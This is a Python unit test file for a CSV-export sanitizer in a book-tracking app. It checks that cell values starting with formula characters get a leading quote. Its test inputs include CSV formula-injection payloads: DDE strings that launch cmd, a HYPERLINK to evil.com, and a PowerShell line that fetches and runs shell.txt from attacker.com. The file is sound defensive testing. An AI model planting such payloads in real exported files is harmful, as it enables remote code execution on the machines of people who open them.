"""
Unit tests for CSV injection prevention.

Tests the sanitization of CSV values to prevent formula injection attacks
where malicious formulas could be executed in spreadsheet applications.
"""


from app.services.media_service.csv_export_service import sanitize_csv_value


class TestCSVInjectionPrevention:
    """Test CSV formula injection prevention."""

    def test_sanitize_normal_text(self) -> None:
        """Test that normal text is not modified."""
        assert sanitize_csv_value("Normal Book Title") == "Normal Book Title"
        assert sanitize_csv_value("Author Name") == "Author Name"
        assert sanitize_csv_value("Some notes here") == "Some notes here"

    def test_sanitize_none_value(self) -> None:
        """Test that None values return empty string."""
        assert sanitize_csv_value(None) == ""

    def test_sanitize_empty_string(self) -> None:
        """Test that empty strings remain empty."""
        assert sanitize_csv_value("") == ""

    def test_sanitize_integer(self) -> None:
        """Test that integers are converted to strings."""
        assert sanitize_csv_value(42) == "42"
        assert sanitize_csv_value(0) == "0"

    def test_sanitize_formula_equals(self) -> None:
        """Test that values starting with = are sanitized."""
        assert sanitize_csv_value("=1+1") == "'=1+1"
        assert sanitize_csv_value("=SUM(A1:A10)") == "'=SUM(A1:A10)"
        assert sanitize_csv_value("=cmd|'/c calc'!A1") == "'=cmd|'/c calc'!A1"

    def test_sanitize_formula_plus(self) -> None:
        """Test that values starting with + are sanitized."""
        assert sanitize_csv_value("+1+1") == "'+1+1"
        assert sanitize_csv_value("+SUM(A1:A10)") == "'+SUM(A1:A10)"

    def test_sanitize_formula_minus(self) -> None:
        """Test that values starting with - are sanitized."""
        assert sanitize_csv_value("-1+1") == "'-1+1"
        assert sanitize_csv_value("-SUM(A1:A10)") == "'-SUM(A1:A10)"

    def test_sanitize_formula_at(self) -> None:
        """Test that values starting with @ are sanitized."""
        assert sanitize_csv_value("@SUM(A1:A10)") == "'@SUM(A1:A10)"
        assert sanitize_csv_value("@dangerous") == "'@dangerous"

    def test_sanitize_formula_tab(self) -> None:
        """Test that values starting with tab are sanitized."""
        assert sanitize_csv_value("\t=1+1") == "'\t=1+1"
        assert sanitize_csv_value("\tSUM(A1)") == "'\tSUM(A1)"

    def test_sanitize_formula_carriage_return(self) -> None:
        """Test that values starting with carriage return are sanitized."""
        assert sanitize_csv_value("\r=1+1") == "'\r=1+1"
        assert sanitize_csv_value("\rSUM(A1)") == "'\rSUM(A1)"

    def test_sanitize_middle_formula_chars(self) -> None:
        """Test that formula chars in the middle of text are not modified."""
        assert sanitize_csv_value("Title with = sign") == "Title with = sign"
        assert sanitize_csv_value("Cost is +$50") == "Cost is +$50"
        assert sanitize_csv_value("Temperature: -5°C") == "Temperature: -5°C"
        assert sanitize_csv_value("Email@domain.com") == "Email@domain.com"

    def test_sanitize_dde_attack(self) -> None:
        """Test that DDE (Dynamic Data Exchange) attacks are prevented."""
        # Common DDE injection patterns
        assert sanitize_csv_value("=cmd|'/c calc'!A1") == "'=cmd|'/c calc'!A1"
        assert sanitize_csv_value("=HYPERLINK(\"http://evil.com\",\"Click\")") == "'=HYPERLINK(\"http://evil.com\",\"Click\")"

    def test_sanitize_complex_payload(self) -> None:
        """Test sanitization of complex injection payloads."""
        payload = "=1+1+cmd|'/c powershell IEX(wget attacker.com/shell.txt)'!A1"
        expected = f"'{payload}"
        assert sanitize_csv_value(payload) == expected

    def test_sanitize_whitespace_only(self) -> None:
        """Test that whitespace-only strings are handled correctly."""
        assert sanitize_csv_value("   ") == "   "
        assert sanitize_csv_value("\n\n") == "\n\n"

    def test_sanitize_unicode(self) -> None:
        """Test that unicode characters are handled correctly."""
        assert sanitize_csv_value("日本語タイトル") == "日本語タイトル"
        assert sanitize_csv_value("Café ☕") == "Café ☕"
        assert sanitize_csv_value("=日本語") == "'=日本語"

    def test_sanitize_realistic_book_data(self) -> None:
        """Test with realistic book data that could contain injection attempts."""
        # Legitimate book titles that might start with special chars
        assert sanitize_csv_value("-273°C: Life on Ice") == "'-273°C: Life on Ice"
        assert sanitize_csv_value("+1: The Programmer's Journey") == "'+1: The Programmer's Journey"

        # Malicious notes field
        malicious_notes = "=cmd|'/c calc'!A1 - Great book!"
        assert sanitize_csv_value(malicious_notes) == f"'{malicious_notes}"

    def test_sanitize_preserves_content(self) -> None:
        """Test that sanitization preserves the original content."""
        original = "=DANGEROUS_FORMULA()"
        sanitized = sanitize_csv_value(original)
        # The sanitized version should contain the full original string
        assert original in sanitized
        assert sanitized.startswith("'")
